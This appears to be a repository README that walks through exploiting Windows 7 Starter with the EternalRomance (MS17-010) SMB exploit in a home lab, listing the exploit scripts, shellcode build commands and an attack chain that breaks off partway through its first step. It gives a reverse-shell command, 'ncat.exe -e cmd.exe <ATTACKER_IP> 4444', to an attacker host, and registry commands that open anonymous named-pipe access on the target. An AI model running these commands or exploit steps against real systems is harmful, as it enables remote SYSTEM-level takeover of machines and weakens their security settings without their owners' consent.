# 🏴‍☠️ Windows 7 Starter: EternalRomance & Ncat SYSTEM Shell

**Author:** Musa
**Target:** Windows 7 Starter SP1 (x86) - *Tested and Confirmed*
**Attacker:** Windows 11 (Python 3.14)
**Date:** November 2026

## ⚠️ IMPORTANT DISCLAIMER
**This repository is specifically for Windows 7 Starter Edition.** 
I have tested this extensively on Starter, not Professional or Ultimate. If you are on Professional, `eternalblue_exploit7.py` will work out of the box. However, Starter's kernel is highly restricted, so EternalBlue will cause a `BCCode: d1` Blue Screen of Death. 

**This guide uses EternalRomance (`zzz_exploit.py`) to bypass the kernel entirely.** If you want a fully working, stable shell on Windows 7 Starter, this is exactly how you do it.

---

## 📖 The Story
After a grueling 2-hour download at 160 KB/s, we installed Windows 7 Starter on a 297GB drive. We tried EternalBlue but kept getting kernel panics. We pivoted to **EternalRomance**, fixed a Python 3.14 `ord()` bug, enabled anonymous named pipes, and got a semi-interactive SYSTEM shell. Finally, we used `ncat` to upgrade it to a fully interactive reverse shell.

---

## 📂 File Breakdown & Usage

### 1. `zzz_exploit.py` (The Weapon)
This is the core exploit script. It uses the **EternalRomance** technique (MS17-010) to overwrite the SMB session token in memory, granting you SYSTEM privileges without touching the kernel. 
*   **How to use:** `python zzz_exploit.py <TARGET_IP>`
*   **Note:** You must patch the `ord()` bug on Line 324 for Python 3 to work.

### 2. `mysmb.py` (The SMB Library)
This is a custom Python 3 library that handles the raw SMB packets. `zzz_exploit.py` relies on this to communicate with the target. You don't run this file directly; it's imported by the exploit.

### 3. `eternalblue_kshellcode_x86.asm` (The Assembly)
This is the raw x86 assembly code for the kernel shellcode. We don't use this directly, but we compile it with NASM to create the binary payload. *(Note: This is only needed if you are attempting EternalBlue, not EternalRomance).*

### 4. `nasm.exe` (The Compiler)
NASM (Netwide Assembler) is the tool used to compile the `.asm` file into a `.bin` file. 
*   **How to use:** `nasm.exe -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin`

### 5. `sc_x86.bin` (The Payload)
This is the merged shellcode file. It contains the compiled kernel assembly and the 32-bit payload. 
*   **How to create:** `copy /b sc_x86_kernel.bin + sc_x86_payload.bin sc_x86.bin`
*   *Note: This is required for EternalBlue, but NOT required for EternalRomance.*

### 6. `ncat.exe` (The Shell Upgrader)
Ncat is a networking utility from the Nmap project. We drop this onto the target to upgrade the semi-interactive shell into a fully interactive reverse shell.
*   **How to use:** `C:\ncat.exe -e cmd.exe <ATTACKER_IP> 4444`

---

## 🚀 Step-by-Step Attack Chain

### Step 1: Fix the Named Pipe Permissions on Windows 7
Because Starter restricts anonymous SMB access, we must force it to allow named pipes.
Open `cmd` as Administrator on the Windows 7 VM and run:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v NullSessionPipes /t REG_MULTI_SZ /d "browser\0spoolss\0lsarpc\0samr" /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RestrictAnonymous /t REG_DWORD /d 0 /f
